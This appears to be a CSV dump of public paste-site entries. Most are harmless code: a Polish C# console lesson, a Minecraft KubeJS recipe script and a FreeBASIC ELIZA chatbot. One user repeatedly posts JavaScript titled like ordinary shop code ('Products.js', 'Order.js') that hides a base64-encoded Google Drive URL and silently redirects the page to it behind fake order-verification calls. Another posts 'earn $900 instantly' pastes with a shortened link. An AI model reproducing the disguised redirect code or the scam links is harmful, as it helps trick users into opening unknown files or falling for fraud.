id,title,username,language,date,content
12jXW4VK,EARN $900 INSTANTLY 2025 BT,TypicalGamer1227,JavaScript,Saturday 29th of March 2025 07:01:30 AM CDT," 
Pdf https://tinyurl.com/methodssss


icFdkk1a1Q
"
xV1f4jj3,Untitled,navrajkhunger,JavaScript,Saturday 29th of March 2025 07:00:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/590/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HBnyKVA4,debug,Cassimus,C#,Saturday 29th of March 2025 07:00:18 AM CDT,"public class Lekcja8
{
    public static void Main(string[] args)
    {
        System.Console.WriteLine(""Cześć! Jak masz na imię?"");
        string? imie = Console.ReadLine();

        if (imie == null) return;

        System.Console.WriteLine($""Witaj {imie.ToUpper()}. Co Chcesz robić?: "");
        System.Console.WriteLine(""a. dodawanie \nb. odejmowanie \nc. mnożenie \nd. dzielenie"");

        string? wybor = Console.ReadLine();
        if (wybor == null) return;

        Console.Write(""Podaj pierwszą liczbę: "");
        int liczba1;

        try
        {
            liczba1 = int.Parse(Console.ReadLine()!);
        }
        catch (FormatException format)
        {
            System.Console.WriteLine(""Podana wartość nie jest liczbą"");
            System.Console.WriteLine(format.Message);
            return;
        }
        catch (Exception)
        {
            System.Console.WriteLine(""Coś poszlo nie tak"");
            return;
        }

        int liczba2;
        bool parsowanie = int.TryParse(Console.ReadLine(), out liczba2);

        if (!parsowanie)
        {
            System.Console.WriteLine(""To nie jest liczba"");
            return;
        }

        System.Console.WriteLine($""Podałeś liczbę: {liczba1}"");

    }
}

"
n6werbVV,dataNone,TestGuy1,JSON,Saturday 29th of March 2025 07:00:08 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '901994cf17ff280b14d0c971a40c830a2e8fc6bd8fd4d4d902f753cc3af87f814b473c097bf6ad3776b307dd41625a2045b4f073baa73a986decb9039468b8b89958aee958bd358971244ecc45d36de570233841c11f4fca41ac82a5dc32a0ea7df903df2838bdc0fa91226d7c4b55b338912864bf86680237767ccad4560026',
  otherdata: [
    '3c960dfd7c0b63ea89f0938facfb3c92',
    'f10e3c2851b74f55de7558b7401165e6',
    'f4fe021e3c52e5e8513574169b3884fd',
    'f9a2aa27fd8b08cc70087e2c94d65517',
    '34d74f3806bb371cdf61c430bf057958',
    '9394754da3c56bbc9d035f9a9ce2d3c2',
    '349770ba2c96a21bfe774244b84b99df',
    '8930215732f67c8bcd54d5400eb1d8ff'
  ]
}"
9cV5w9Tp,Script JS pour remplacer le craft des coffres sans devoir tous les faires un par un,Alexisdepris,JavaScript,Saturday 29th of March 2025 06:54:30 AM CDT,"ServerEvents.recipes(e => {
    let woodToChestMap = {
        // Ecologics
        'ecologics:coconut_planks': 'everycomp:q/ecologics/coconut_chest',
        'ecologics:azalea_planks': 'everycomp:q/ecologics/azalea_chest',
        'ecologics:walnut_planks': 'everycomp:q/ecologics/walnut_chest',
        // Nature's Spirit
        'natures_spirit:cedar_planks': 'everycomp:q/natures_spirit/cedar_chest',
        'natures_spirit:larch_planks': 'everycomp:q/natures_spirit/larch_chest',
        'natures_spirit:mahogany_planks': 'everycomp:q/natures_spirit/mahogany_chest',
        'natures_spirit:saxaul_planks': 'everycomp:q/natures_spirit/saxaul_chest',
        'natures_spirit:redwood_planks': 'everycomp:q/natures_spirit/redwood_chest',
        'natures_spirit:sugi_planks': 'everycomp:q/natures_spirit/sugi_chest',
        'natures_spirit:wisteria_planks': 'everycomp:q/natures_spirit/wisteria_chest',
        'natures_spirit:fir_planks': 'everycomp:q/natures_spirit/fir_chest',
        'natures_spirit:coconut_planks': 'everycomp:q/natures_spirit/coconut_chest',
        'natures_spirit:willow_planks': 'everycomp:q/natures_spirit/willow_chest',
        'natures_spirit:aspen_planks': 'everycomp:q/natures_spirit/aspen_chest',
        'natures_spirit:maple_planks': 'everycomp:q/natures_spirit/maple_chest',
        'natures_spirit:cypress_planks': 'everycomp:q/natures_spirit/cypress_chest',
        'natures_spirit:olive_planks': 'everycomp:q/natures_spirit/olive_chest',
        'natures_spirit:joshua_planks': 'everycomp:q/natures_spirit/joshua_chest',
        'natures_spirit:ghaf_planks': 'everycomp:q/natures_spirit/ghaf_chest',
        'natures_spirit:palo_verde_planks': 'everycomp:q/natures_spirit/palo_verde_chest',
        // Wevegone
        'biomeswevegone:aspen_planks': 'everycomp:q/biomeswevegone/aspen_chest',
        'biomeswevegone:baobab_planks': 'everycomp:q/biomeswevegone/baobab_chest',
        'biomeswevegone:blue_enchanted_planks': 'everycomp:q/biomeswevegone/blue_enchanted_chest',
        'biomeswevegone:cika_planks': 'everycomp:q/biomeswevegone/cika_chest',
        'biomeswevegone:cypress_planks': 'everycomp:q/biomeswevegone/cypress_chest',
        'biomeswevegone:ebony_planks': 'everycomp:q/biomeswevegone/ebony_chest',
        'biomeswevegone:fir_planks': 'everycomp:q/biomeswevegone/fir_chest',
        'biomeswevegone:green_enchanted_planks': 'everycomp:q/biomeswevegone/green_enchanted_chest',
        'biomeswevegone:holly_planks': 'everycomp:q/biomeswevegone/holly_chest',
        'biomeswevegone:skyris_planks': 'everycomp:q/biomeswevegone/skyris_chest',
        'biomeswevegone:white_mangrove_planks': 'everycomp:q/biomeswevegone/white_mangrove_chest',
        'biomeswevegone:willow_planks': 'everycomp:q/biomeswevegone/willow_chest',
        'biomeswevegone:witch_hazel_planks': 'everycomp:q/biomeswevegone/witch_hazel_chest',
        'biomeswevegone:zelkova_planks': 'everycomp:q/biomeswevegone/zelkova_chest',
        'biomeswevegone:ironwood_planks': 'everycomp:q/biomeswevegone/ironwood_chest',
        'biomeswevegone:jacaranda_planks': 'everycomp:q/biomeswevegone/jacaranda_chest',
        'biomeswevegone:mahogany_planks': 'everycomp:q/biomeswevegone/mahogany_chest',
        'biomeswevegone:maple_planks': 'everycomp:q/biomeswevegone/maple_chest',
        'biomeswevegone:palm_planks': 'everycomp:q/biomeswevegone/palm_chest',
        'biomeswevegone:pine_planks': 'everycomp:q/biomeswevegone/pine_chest',
        'biomeswevegone:rainbow_eucalyptus_planks': 'everycomp:q/biomeswevegone/rainbow_eucalyptus_chest',
        'biomeswevegone:redwood_planks': 'everycomp:q/biomeswevegone/redwood_chest',
        'biomeswevegone:sakura_planks': 'everycomp:q/biomeswevegone/sakura_chest',
        // Quark
        'quark:ancient_planks': 'quark:ancient_chest',
        'quark:azalea_planks': 'quark:azalea_chest',
        'quark:blossom_planks': 'quark:blossom_chest',
        'minecraft:oak_planks': 'quark:oak_chest',
        'minecraft:spruce_planks': 'quark:spruce_chest',
        'minecraft:birch_planks': 'quark:birch_chest',
        'minecraft:jungle_planks': 'quark:jungle_chest',
        'minecraft:acacia_planks': 'quark:acacia_chest',
        'minecraft:dark_oak_planks': 'quark:dark_oak_chest',
        'minecraft:prismarine': 'quark:prismarine_chest',
        'minecraft:purpur_block': 'quark:purpur_chest',
        'minecraft:nether_bricks': 'quark:nether_brick_chest',
        'minecraft:cherry_planks': 'quark:cherry_chest',
        'minecraft:bamboo_block': 'quark:bamboo_chest',
        'minecraft:mangrove_planks': 'quark:mangrove_chest',
        'minecraft:warped_planks': 'quark:warped_chest',
        'minecraft:crimson_planks': 'quark:crimson_chest'
    };

    for (let plank in woodToChestMap) {
        let chest = woodToChestMap[plank];
        
        // Suppression des recettes existantes pour éviter les conflits
        e.remove({ output: chest });
        
        // Ajout de la nouvelle recette avec une pépite de fer au centre
        e.shaped(Item.of(chest), [
            'PPP',
            'PIP',
            'PPP'
        ], {
            P: plank,
            I: 'minecraft:iron_nugget'
        });
    }
});
"
DZPPKwWJ,Random Gmail Acc 1A,TypicalGamer1227,JavaScript,Saturday 29th of March 2025 06:45:36 AM CDT," 
Pdf https://tinyurl.com/methodssss


8ggjHeyf5V
"
cx8wi3vj,Products.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 06:45:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/641/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UidXtdTv,Make $1000 15-MINUTES (BEGINNER) WM,TypicalGamer1227,JavaScript,Saturday 29th of March 2025 06:29:41 AM CDT," 
Pdf https://tinyurl.com/methodssss


EJB4IPT3Cq
"
HZVsrZS1,Order.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 06:29:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/130/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tEHcgDQu,Untitled,ronblue,FreeBasic,Saturday 29th of March 2025 06:15:44 AM CDT,"' ELIZA in FreeBASIC with DOS-style Interface
' A nostalgic implementation of the classic ELIZA program
' Based on the original concept by Joseph Weizenbaum

#include ""fbgfx.bi""  ' Include graphics library

' Define variable types
Type KeywordPattern
    keyword As String
    rank As Integer
    responses(9) As String
    responseCount As Integer
End Type

Type Transformation
    pattern As String
    replacement As String
End Type

' Main program
Dim Shared patterns(20) As KeywordPattern
Dim Shared transforms(30) As Transformation
Dim Shared patternCount As Integer
Dim Shared transformCount As Integer
Dim Shared conversationHistory(100) As String
Dim Shared historyCount As Integer = 0

' Colors for DOS-style interface - using constants to avoid COLOR reserved word
Const C_FRAME = 9        ' Light blue
Const C_TITLE = 14       ' Yellow
Const C_TEXT = 7         ' Light gray
Const C_USER = 15        ' Bright white
Const C_ELIZA = 11       ' Cyan
Const C_STATUS = 10      ' Light green
Const C_BACKGROUND = 1   ' Blue

' Initialize patterns and transformations
Sub InitializePatterns()
    ' Keywords with their responses
    ' Pattern 1: ""i need""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i need""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Why do you need %s?""
    patterns(patternCount).responses(1) = ""Would it really help you to get %s?""
    patterns(patternCount).responses(2) = ""Are you sure you need %s?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 2: ""sorry""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""sorry""
    patterns(patternCount).rank = 4
    patterns(patternCount).responses(0) = ""There's no need to apologize.""
    patterns(patternCount).responses(1) = ""What feelings do you have when you apologize?""
    patterns(patternCount).responses(2) = ""I've told you that apologies are not necessary.""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 3: ""i am"" or ""im""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i am""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Did you come to me because you are %s?""
    patterns(patternCount).responses(1) = ""How long have you been %s?""
    patterns(patternCount).responses(2) = ""How do you feel about being %s?""
    patterns(patternCount).responses(3) = ""Do you believe it is normal to be %s?""
    patterns(patternCount).responses(4) = ""Do you enjoy being %s?""
    patterns(patternCount).responseCount = 5

    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""im""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Did you come to me because you're %s?""
    patterns(patternCount).responses(1) = ""How long have you been %s?""
    patterns(patternCount).responses(2) = ""How do you feel about being %s?""
    patterns(patternCount).responses(3) = ""Do you believe it is normal to be %s?""
    patterns(patternCount).responses(4) = ""Do you enjoy being %s?""
    patterns(patternCount).responseCount = 5
    
    ' Pattern 4: ""i believe""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i believe""
    patterns(patternCount).rank = 4
    patterns(patternCount).responses(0) = ""Do you really believe %s?""
    patterns(patternCount).responses(1) = ""But you're not sure you %s?""
    patterns(patternCount).responses(2) = ""Do you really doubt you %s?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 5: ""i feel""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i feel""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Tell me more about such feelings.""
    patterns(patternCount).responses(1) = ""Do you often feel %s?""
    patterns(patternCount).responses(2) = ""Do you enjoy feeling %s?""
    patterns(patternCount).responses(3) = ""What does feeling %s remind you of?""
    patterns(patternCount).responseCount = 4
    
    ' Pattern 6: ""i cant""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i cant""
    patterns(patternCount).rank = 4
    patterns(patternCount).responses(0) = ""How do you know you can't %s?""
    patterns(patternCount).responses(1) = ""Have you tried?""
    patterns(patternCount).responses(2) = ""Perhaps you could %s now.""
    patterns(patternCount).responses(3) = ""Do you really want to be able to %s?""
    patterns(patternCount).responseCount = 4
    
    ' Pattern 7: ""i want""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i want""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""What would it mean to you if you got %s?""
    patterns(patternCount).responses(1) = ""Why do you want %s?""
    patterns(patternCount).responses(2) = ""What would you do if you got %s?""
    patterns(patternCount).responses(3) = ""If you got %s, then what would you do?""
    patterns(patternCount).responseCount = 4
    
    ' Pattern 8: ""what""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""what""
    patterns(patternCount).rank = 3
    patterns(patternCount).responses(0) = ""Why do you ask?""
    patterns(patternCount).responses(1) = ""Does that question interest you?""
    patterns(patternCount).responses(2) = ""What is it you really want to know?""
    patterns(patternCount).responses(3) = ""Are such questions much on your mind?""
    patterns(patternCount).responses(4) = ""What do you think?""
    patterns(patternCount).responses(5) = ""What comes to mind when you ask that?""
    patterns(patternCount).responseCount = 6
    
    ' Pattern 9: ""how""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""how""
    patterns(patternCount).rank = 3
    patterns(patternCount).responses(0) = ""How do you suppose?""
    patterns(patternCount).responses(1) = ""Perhaps you can answer your own question.""
    patterns(patternCount).responses(2) = ""What is it you're really asking?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 10: ""who""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""who""
    patterns(patternCount).rank = 3
    patterns(patternCount).responses(0) = ""Why do you ask about %s?""
    patterns(patternCount).responses(1) = ""Would it matter to you?""
    patterns(patternCount).responses(2) = ""What do you think?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 11: generic responses for no match
    patternCount = patternCount + 1
    patterns(patternCount).keyword = """"
    patterns(patternCount).rank = 1
    patterns(patternCount).responses(0) = ""Very interesting.""
    patterns(patternCount).responses(1) = ""I see.""
    patterns(patternCount).responses(2) = ""I'm not sure I understand you fully.""
    patterns(patternCount).responses(3) = ""Can you elaborate on that?""
    patterns(patternCount).responses(4) = ""That is quite interesting.""
    patterns(patternCount).responses(5) = ""Please tell me more.""
    patterns(patternCount).responses(6) = ""Let's change focus a bit... Tell me about your family.""
    patterns(patternCount).responses(7) = ""Can you elaborate on that?""
    patterns(patternCount).responses(8) = ""Why do you say that?""
    patterns(patternCount).responses(9) = ""I see. And what does that suggest to you?""
    patterns(patternCount).responseCount = 10
    
    ' Set up transformations from first person to second person, etc.
    transformCount = 0
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" i ""
    transforms(transformCount).replacement = "" you ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" im ""
    transforms(transformCount).replacement = "" you're ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" i am ""
    transforms(transformCount).replacement = "" you are ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" my ""
    transforms(transformCount).replacement = "" your ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" me ""
    transforms(transformCount).replacement = "" you ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" mine ""
    transforms(transformCount).replacement = "" yours ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" you ""
    transforms(transformCount).replacement = "" I ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" your ""
    transforms(transformCount).replacement = "" my ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" yours ""
    transforms(transformCount).replacement = "" mine ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" you are ""
    transforms(transformCount).replacement = "" I am ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" you're ""
    transforms(transformCount).replacement = "" I'm ""
End Sub

' Transform user input for response
Function TransformInput(userInputText As String) As String
    Dim As String resultText = LCase(userInputText)
    
    ' Apply transformations
    For i As Integer = 1 To transformCount
        Dim As String patternText = transforms(i).pattern
        Dim As String replacementText = transforms(i).replacement
        
        ' Simple replace - in a more advanced version, use regular expressions
        Dim As Integer positionVal = InStr(resultText, patternText)
        While positionVal > 0
            resultText = Left(resultText, positionVal - 1) + replacementText + Mid(resultText, positionVal + Len(patternText))
            positionVal = InStr(positionVal + Len(replacementText), resultText, patternText)
        Wend
    Next
    
    Return resultText
End Function

' Find the best matching pattern
Function FindPattern(userInputText As String) As Integer
    Dim As Integer bestMatch = patternCount ' Default to generic responses
    Dim As Integer bestRank = 0
    
    ' Convert input to lowercase for case-insensitive matching
    Dim As String inputText = LCase(userInputText)
    
    ' Look for each pattern in the input
    For i As Integer = 1 To patternCount
        Dim As String keyword = patterns(i).keyword
        Dim As Integer positionVal = InStr(inputText, keyword)
        
        If positionVal > 0 And patterns(i).rank > bestRank Then
            bestMatch = i
            bestRank = patterns(i).rank
        End If
    Next
    
    Return bestMatch
End Function

' Get remainder of input after keyword
Function GetRemainder(userInputText As String, keywordIndex As Integer) As String
    Dim As String inputText = LCase(userInputText)
    Dim As String keyword = patterns(keywordIndex).keyword
    Dim As Integer positionVal = InStr(inputText, keyword)
    
    If positionVal > 0 And Len(keyword) > 0 Then
        Return Mid(inputText, positionVal + Len(keyword))
    Else
        Return """"
    End If
End Function

' Draw a single-line box
Sub DrawBox(x1 As Integer, y1 As Integer, x2 As Integer, y2 As Integer, boxColor As Integer)
    Color boxColor
    ' Top and bottom lines
    Line (x1, y1)-(x2, y1)
    Line (x1, y2)-(x2, y2)
    ' Left and right lines
    Line (x1, y1)-(x1, y2)
    Line (x2, y1)-(x2, y2)
End Sub

' Draw a double-line box
Sub DrawDoubleBox(x1 As Integer, y1 As Integer, x2 As Integer, y2 As Integer, boxColor As Integer)
    Color boxColor
    ' Outer box
    DrawBox(x1, y1, x2, y2, boxColor)
    ' Inner box
    DrawBox(x1 + 1, y1 + 1, x2 - 1, y2 - 1, boxColor)
End Sub

' Draw title bar
Sub DrawTitleBar(titleText As String)
    Color C_TITLE, C_FRAME
    ' Draw title background
    Line (1, 1)-(80, 3), C_FRAME, BF
    ' Print centered title
    Locate 2, 40 - Len(titleText) \ 2
    Print titleText;
End Sub

' Draw status bar
Sub DrawStatusBar(statusText As String)
    Color C_STATUS, C_FRAME
    ' Draw status background
    Line (1, 25)-(80, 25), C_FRAME, BF
    ' Print left-aligned status
    Locate 25, 2
    Print statusText;
    ' Print right-aligned help
    Locate 25, 60
    Print ""Press ESC to exit"";
End Sub

' Draw intro animation
Sub DrawIntro()
    Dim As String titleText = "" ELIZA - Electronic Psychotherapist ""
    Dim As Integer i, j, center_x = 40, center_y = 12
    
    ' Clear screen 
    Screen 0
    Width 80, 25
    Color C_TEXT, C_BACKGROUND
    Cls
    
    ' Draw expanding circles animation
    For i = 1 To 15
        Circle (center_x, center_y), i, (i Mod 7) + 9
        Sleep 50
    Next i
    
    ' Animate title appear
    For i = 1 To Len(titleText)
        Locate center_y, center_x - Len(titleText) \ 2 + i
        Color ((i Mod 7) + 9)
        Print Mid(titleText, i, 1);
        Sleep 50
    Next i
    
    ' Flash the title
    For i = 1 To 3
        For j = 9 To 15
            Locate center_y, center_x - Len(titleText) \ 2
            Color j
            Print titleText;
            Sleep 50
        Next j
    Next i
    
    ' Wait a moment
    Sleep 500
    
    ' Clear the screen again for main interface
    Color C_TEXT, C_BACKGROUND
    Cls
End Sub

' Draw main interface
Sub DrawInterface()
    ' Clear screen with background color
    Color C_TEXT, C_BACKGROUND
    Cls
    
    ' Draw outer frame
    DrawDoubleBox(1, 1, 80, 25, C_FRAME)
    
    ' Draw title bar
    DrawTitleBar(""ELIZA - Psychological Computer Therapist v2.1"")
    
    ' Draw conversation area frame
    DrawBox(2, 4, 79, 20, C_FRAME)
    
    ' Draw input area frame
    DrawBox(2, 21, 79, 24, C_FRAME)
    
    ' Draw status bar
    DrawStatusBar(""Ready for conversation"")
    
    ' Initial prompt
    Locate 5, 4
    Color C_ELIZA
    Print ""ELIZA: Hello, I am ELIZA. How are you feeling today?"";
    
    ' Set input prompt
    Locate 22, 4
    Color C_USER
    Print ""YOU: "";
End Sub

' Update conversation area with history
Sub UpdateConversation()
    ' Clear conversation area
    Color C_TEXT, C_BACKGROUND
    For i As Integer = 5 To 19
        Locate i, 4
        Print Space(75);
    Next i
    
    ' Display history (up to the most recent 14 lines)
    Dim As Integer startLine = 0
    If historyCount > 14 Then
        startLine = historyCount - 14
    End If
    
    For i As Integer = startLine To historyCount - 1
        Dim As Integer lineNum = 5 + (i - startLine)
        If Left(conversationHistory(i), 6) = ""ELIZA:"" Then
            Locate lineNum, 4
            Color C_ELIZA
        Else
            Locate lineNum, 4
            Color C_USER
        End If
        ' Wrap text if needed
        Dim As String textLine = conversationHistory(i)
        If Len(textLine) > 75 Then
            Print Left(textLine, 75);
            ' If line is too long, continue on next line
            If lineNum + 1 <= 19 Then
                Locate lineNum + 1, 4
                Print ""    "" + Mid(textLine, 76);
            End If
        Else
            Print textLine;
        End If
    Next i
End Sub

' Add text to conversation history
Sub AddToHistory(speaker As String, textMsg As String)
    conversationHistory(historyCount) = speaker + "": "" + textMsg
    historyCount = historyCount + 1
    UpdateConversation()
End Sub

' Display typing animation for ELIZA's responses
Sub DisplayTypingAnimation(responseText As String)
    Dim As Integer cursorY = 0
    
    ' Find the next available line position
    For i As Integer = 19 To 5 Step -1
        Locate i, 4
        Dim As String currentText = """"
        Dim As Integer visibleText = Pos(i) ' Get cursor position to check if line is empty
        If visibleText = 4 Then  ' If cursor is at starting position, line is empty
            cursorY = i
            Exit For
        End If
    Next i
    
    If cursorY = 0 Then cursorY = 19 ' Default to last line if all full
    
    ' Show ""ELIZA is typing..."" animation
    Locate cursorY, 4
    Color C_ELIZA
    Print ""ELIZA: "";
    
    For i As Integer = 1 To 3
        Print ""."";
        Sleep 300
        Locate cursorY, 10 + i
    Next i
    
    ' Clear the ""typing"" text
    Locate cursorY, 4
    Print Space(15);
    
    ' Type out the response character by character
    Locate cursorY, 4
    Color C_ELIZA
    Print ""ELIZA: "";
    
    For i As Integer = 1 To Len(responseText)
        Print Mid(responseText, i, 1);
        ' Randomize typing speed slightly
        Sleep 30 + (Rnd * 30)
    Next i
End Sub

' Main program
Sub Main()
    Dim As String userInputText, responseText
    Dim As Integer patternIndex, responseIndex
    Dim As String remainder
    Dim As String k
    
    ' Initialize patterns and transformations
    patternCount = 0
    transformCount = 0
    InitializePatterns()
    
    ' Display intro animation
    DrawIntro()
    
    ' Setup main interface
    DrawInterface()
    
    ' Add initial greeting to history
    AddToHistory(""ELIZA"", ""Hello, I am ELIZA. How are you feeling today?"")
    
    ' Main conversation loop
    Do
        ' Get user input
        Locate 22, 9
        Color C_USER
        Line Input """", userInputText
        
        ' Clear input line
        Locate 22, 9
        Print Space(70);
        
        ' Add user input to history
        If Len(userInputText) > 0 Then
            AddToHistory(""YOU"", userInputText)
        End If
        
        ' Exit if user types ""bye""
        If LCase(userInputText) = ""bye"" Then
            DisplayTypingAnimation(""Goodbye. I hope our conversation was helpful."")
            AddToHistory(""ELIZA"", ""Goodbye. I hope our conversation was helpful."")
            
            ' Wait for key press before exiting
            Locate 22, 4
            Color C_STATUS
            Print ""Press any key to exit..."";
            Sleep 500
            Do
                k = Inkey()
            Loop Until Len(k) > 0
            Exit Do
        End If
        
        ' Skip processing if empty input
        If Len(userInputText) = 0 Then
            DisplayTypingAnimation(""I didn't quite catch that. Can you say something?"")
            AddToHistory(""ELIZA"", ""I didn't quite catch that. Can you say something?"")
        Else
            ' Find the best matching pattern
            patternIndex = FindPattern(userInputText)
            
            ' Get a random response for this pattern
            responseIndex = Int(Rnd * patterns(patternIndex).responseCount)
            responseText = patterns(patternIndex).responses(responseIndex)
            
            ' If the response contains a placeholder, replace it with transformed input
            If InStr(responseText, ""%s"") > 0 Then
                remainder = GetRemainder(userInputText, patternIndex)
                remainder = TransformInput(remainder)
                
                ' Custom replacement for ""%s"" with remainder
                Dim As Integer placeholderPos = InStr(responseText, ""%s"")
                If placeholderPos > 0 Then
                    responseText = Left(responseText, placeholderPos - 1) + remainder + _
                                  Mid(responseText, placeholderPos + 2)
                End If
            End If
            
            ' Show typing animation and add to history
            DisplayTypingAnimation(responseText)
            AddToHistory(""ELIZA"", responseText)
        End If
        
        ' Check for escape key to exit
        k = Inkey()
        If k = Chr(27) Then ' ESC key
            Exit Do
        End If
    Loop
    
    ' Clean up
    Screen 0
    Width 80, 25
    Color 7, 0
    Cls
End Sub

' Start the program
Randomize Timer
Main()
End"
